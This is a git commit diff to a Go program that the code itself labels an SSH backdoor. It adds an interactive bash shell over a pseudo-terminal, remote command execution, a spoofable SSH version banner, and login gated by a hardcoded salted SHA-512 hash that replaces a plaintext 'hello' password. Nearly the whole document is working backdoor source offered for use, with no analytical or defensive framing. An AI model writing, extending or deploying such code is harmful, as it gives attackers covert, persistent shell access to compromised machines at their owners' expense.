2994049af689309181a0a2841f9c924f2df4581b
James <james@cookjames.co.uk>
2020-07-15 00:58:42 +0100

    Now with real terminals

--- main.go
+++ main.go
@@ -1,16 +1,22 @@
 package main
 
 import (
+	"crypto/sha512"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net"
 	"os/exec"
 
+	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
 	"github.com/integrii/flaggy"
 	gossh "golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/ssh/terminal"
 )
+
+var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
 
 func main() {
 	var (
@@ -24,6 +30,7 @@ func main() {
 	flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
 	flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
 	flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
+	flaggy.String(&hash, "a", "hash", "Hash for backdoor")
 	flaggy.Parse()
 
 	log.SetPrefix("SSH - ")
@@ -37,7 +44,7 @@ func main() {
 	}
 	server := &ssh.Server{
 		Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
-		Handler:         sshHandler,
+		Handler:         sshterminal,
 		Version:         fingerprint,
 		PasswordHandler: passwordHandler,
 	}
@@ -45,25 +52,58 @@ func main() {
 	log.Println("Started SSH backdoor on", server.Addr)
 	log.Fatal(server.ListenAndServe())
 }
+func verifyPass(hash, salt, password string) bool {
+	resultHash := hashPassword(password, salt)
+	return resultHash == hash
+}
+
+func hashPassword(password string, salt string) string {
+	hash := sha512.Sum512([]byte(password + salt))
+	return fmt.Sprintf("%x", hash)
+}
 
 func sshHandler(s ssh.Session) {
 	command := s.RawCommand()
-	s.Write([]byte(runCommand(command)))
+	if command != "" {
+		s.Write(runCommand(command))
+		return
+	}
+	term := terminal.NewTerminal(s, "$ ")
+	for {
+		command, _ = term.ReadLine()
+		if command == "exit" {
+			return
+		}
+		term.Write(runCommand(command))
+	}
 }
 
-func runCommand(cmd string) string {
+func sshterminal(s ssh.Session) {
+	cmd := exec.Command("/bin/bash", "-i")
+	ptyReq, _, isPty := s.Pty()
+	if isPty {
+		cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
+		f, err := pty.Start(cmd)
+		if err != nil {
+			panic(err)
+		}
+		go func() {
+			io.Copy(f, s) // stdin
+		}()
+		io.Copy(s, f) // stdout
+		cmd.Wait()
+	} else {
+		io.WriteString(s, "No PTY requested.\n")
+		s.Exit(1)
+	}
+}
+
+func runCommand(cmd string) []byte {
 	result := exec.Command("/bin/bash", "-c", cmd)
 	response, _ := result.CombinedOutput()
-	return string(response)
-}
-func verifyPass(password string) bool{
-	return password == "hello"
+	return response
 }
 
-func passwordHandler(context ssh.Context, password string) bool {
-	if context.User() == "username" {
-		return verifyPass(password)
-	}
-	verifyPass(password)
-	return false
+func passwordHandler(_ ssh.Context, password string) bool {
+	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
 }
